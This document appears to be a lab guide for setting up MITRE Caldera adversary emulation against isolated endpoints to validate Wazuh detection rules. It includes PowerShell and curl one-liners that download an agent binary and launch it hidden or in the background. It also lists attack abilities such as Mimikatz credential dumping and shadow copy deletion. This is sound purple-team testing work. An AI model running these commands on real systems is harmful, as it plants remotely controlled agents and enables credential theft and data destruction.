# MITRE Caldera — Adversary Emulation Setup

Caldera automates adversary emulation, running real MITRE ATT&CK techniques
against lab endpoints so you can continuously validate that Wazuh detection
rules actually fire. This closes the purple-team loop:

```
Caldera runs technique → Endpoint executes real attack behavior →
Wazuh/Suricata should alert → coverage_calculator.py compares
expected vs. actual alerts → gaps feed back into 09_Detection_Rules/
```

---

## 1. Install Caldera Server (on the SIEM server or a dedicated VM)

```bash
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip3 install -r requirements.txt --break-system-packages

# Start the server (default UI on :8888)
python3 server.py --insecure --build
```

Browse to `http://192.168.56.10:8888` — default credentials are set on
first launch (`red` / generated password shown in console output).

> **Lab network note:** run Caldera with `--insecure` only inside the
> isolated `192.168.56.0/24` host-only network. Never expose this port
> to the internet.

---

## 2. Deploy Caldera Agents (Sandcat)

Caldera agents ("Sandcat") run on each target endpoint and execute
abilities issued by the server. Generate the deployment one-liner from
the Caldera UI: **Campaigns → Agents → Deploy a new agent**.

### Windows victim (PowerShell, run as Administrator)

```powershell
$url = "http://192.168.56.10:8888/file/download"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("file", "sandcat.go")
$wc.Headers.Add("platform", "windows")
$data = $wc.DownloadData($url)
Get-Process | Where-Object {$_.Path -eq "C:\Users\Public\sandcat.exe"} | Stop-Process -Force -ErrorAction SilentlyContinue
Set-Content -Value $data -Encoding Byte -Path "C:\Users\Public\sandcat.exe"
Start-Process -FilePath "C:\Users\Public\sandcat.exe" -ArgumentList "-server http://192.168.56.10:8888 -group red" -WindowStyle hidden
```

### Linux endpoint

```bash
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
  http://192.168.56.10:8888/file/download > sandcat \
  && chmod +x sandcat \
  && ./sandcat -server http://192.168.56.10:8888 -group red &
```

### Verify agent check-in

In the Caldera UI: **Campaigns → Agents** — the new agent should appear
within ~60 seconds with a green "trusted" indicator and the correct
hostname (`win10-victim`, `ubuntu-webserver`, etc.).

---

## 3. Run an Adversary Profile

Caldera ships built-in adversary profiles mapped to ATT&CK. For this lab,
use (or clone) the **"Discovery"** and **"Collection"** profiles, or build
a custom one matching the techniques covered by
[`09_Detection_Rules/local_rules.xml`](../09_Detection_Rules/local_rules.xml):

| Caldera Ability | MITRE Technique | Should trigger Wazuh rule |
|---|---|---|
| Mimikatz credential dump | T1003.001 | `100013` |
| PowerShell encoded command | T1059.001 | `100005` |
| Create local user | T1136.001 | `100009` |
| Add user to local admins | T1098 | `100010` |
| Delete shadow copies | T1490 | `100012` |
| Registry Run key persistence | T1547.001 | `100015` |
| WMIC remote process creation | T1047 | `100008` |

**Operations → Create Operation:**
1. Name: `SOC-Lab-Validation-Run`
2. Select adversary profile (or build a custom one from the table above)
3. Group: `red`
4. Autonomous: `Yes` (or `Manual` to approve each step)
5. Obfuscator: `plain-text` (so signatures aren't artificially evaded)
6. Click **Start**

---

## 4. Cross-Reference Results

After the operation completes, check the Wazuh Dashboard for matching
alerts within the operation's time window, or run:

```bash
python3 16_AI_Automation/mitre_heatmap.py --days 1 --print
```

For an automated pass/fail comparison between what Caldera executed and
what Wazuh actually detected, use:

```bash
python3 12_Purple_Team_Automation/coverage_calculator.py \
  --caldera-operation-id <operation-id> \
  --wazuh-lookback 1h
```

> See also: [`atomic_red_team_tests.yaml`](./atomic_red_team_tests.yaml)
> for a lighter-weight, single-technique alternative to full Caldera
> operations, and
> [`16_AI_Automation/coverage_calculator.py`](../16_AI_Automation/) for
> the gap-analysis logic referenced above.

---

## 5. Scheduling Continuous Validation

For true "continuous monitoring" validation (not just one-off testing),
schedule weekly operations via cron calling the Caldera REST API:

```bash
# /etc/cron.d/caldera-weekly-validation
0 3 * * 1 root curl -s -X POST http://192.168.56.10:8888/api/v2/operations \
  -H "KEY: $CALDERA_API_KEY" -H "Content-Type: application/json" \
  -d '{"name":"Weekly-Validation","adversary":{"adversary_id":"<id>"},"group":"red","autonomous":1}'
```

Pipe results into
[`13_SOC_Performance_Metrics/mttr_calculator.py`](../13_SOC_Performance_Metrics/mttr_calculator.py)
to track detection coverage trends over time alongside MTTD/MTTR.

---

## 6. Cleanup

Remove agents after testing to avoid persistent footholds in the lab:

```bash
# Caldera UI: Campaigns → Agents → select agent → "Kill agent"
# Or via API:
curl -s -X DELETE http://192.168.56.10:8888/api/v2/agents/<paw> \
  -H "KEY: $CALDERA_API_KEY"
```

Restore clean VM snapshots between major purple-team exercises (see
[`03_Environment_Setup/vm_config.md`](../03_Environment_Setup/vm_config.md) → Snapshot Strategy).

---

## Verification Checklist

- [ ] Caldera server reachable at `http://192.168.56.10:8888`
- [ ] At least one agent shows "trusted" status from each victim VM
- [ ] An operation runs to completion without agent disconnects
- [ ] Corresponding Wazuh alerts appear for each executed ability
- [ ] MITRE heatmap (`mitre_heatmap.py`) reflects newly-tested techniques
- [ ] Agents are cleaned up / killed after the exercise